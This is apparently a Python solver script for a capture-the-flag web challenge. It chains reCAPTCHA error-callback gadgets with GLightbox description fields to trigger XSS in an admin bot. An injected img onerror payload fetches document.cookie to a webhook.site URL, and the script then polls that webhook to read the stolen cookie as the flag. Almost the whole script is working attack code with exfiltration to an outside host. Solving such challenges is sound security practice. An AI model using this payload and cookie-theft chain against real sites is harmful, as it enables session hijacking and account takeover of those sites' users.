#!/usr/bin/env python3
import urllib.parse
import urllib.request
import json
import time

# Webhook configuration
WEBHOOK_ID = "9dac072c-d2c9-436e-aa36-ddbef4c3b6ab"
WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_ID}"

# Construct HTML payload
html_payload = f'<div id="w" data-url="{WEBHOOK_URL}"></div>'

# Add 10 GLightbox triggers
for i in range(10):
    html_payload += f'<div class="g-recaptcha" data-sitekey="init{i}" data-error-callback="GLightbox"></div>'

# Add 10 random click triggers
for i in range(10):
    html_payload += f'<div class="g-recaptcha" data-sitekey="click{i}" data-error-callback="random"></div>'

# Add 50 inputs with the corrected XSS payload (using spaces instead of slashes)
for _ in range(50):
    html_payload += '<input name="vote" class="glightbox" data-description="&lt;img src=x onerror=fetch(w.dataset.url+\'?c=\'+document.cookie)&gt;">'

# Target URL for the bot
target_url = "http://localhost:1337/?" + urllib.parse.urlencode({"shareText": html_payload})

# Bot endpoint on the remote challenge server
remote_bot_url = "https://pan-seared-chocolate-alongside-smashed-gremolata-uumv.gpn24.ctf.kitctf.de/bot/run?" + urllib.parse.urlencode({"url": target_url})

print(f"[+] Webhook URL: {WEBHOOK_URL}")
print(f"[+] Target URL (inside bot): {target_url}")
print(f"[+] Total payload length: {len(target_url)} characters")
print(f"[+] Sending request to remote bot: {remote_bot_url}")

# Send the request to the bot
req = urllib.request.Request(remote_bot_url, headers={"User-Agent": "cookoff-solver/1.0"})
try:
    with urllib.request.urlopen(req, timeout=20) as r:
        print(f"[+] Bot response: {r.read().decode('utf-8')}")
except Exception as e:
    print(f"[-] Bot request failed: {e}")

print("[+] Waiting 12 seconds for the bot to run and execute XSS...")
time.sleep(12)

# Retrieve webhook requests
webhook_api_url = f"https://webhook.site/token/{WEBHOOK_ID}/requests"
print(f"[+] Fetching captured requests from: {webhook_api_url}")

req_webhook = urllib.request.Request(webhook_api_url, headers={"User-Agent": "cookoff-solver/1.0"})
try:
    with urllib.request.urlopen(req_webhook) as r:
        res = json.loads(r.read().decode('utf-8'))
        requests_data = res.get("data", [])
        print(f"[+] Found {len(requests_data)} request(s)")
        for item in requests_data:
            query = item.get("query", {})
            if "c" in query:
                print(f"[!] FLAG FOUND: {query['c']}")
                exit(0)
    print("[-] Flag not found in the captured requests. Let's try running again.")
except Exception as e:
    print(f"[-] Webhook fetch failed: {e}")
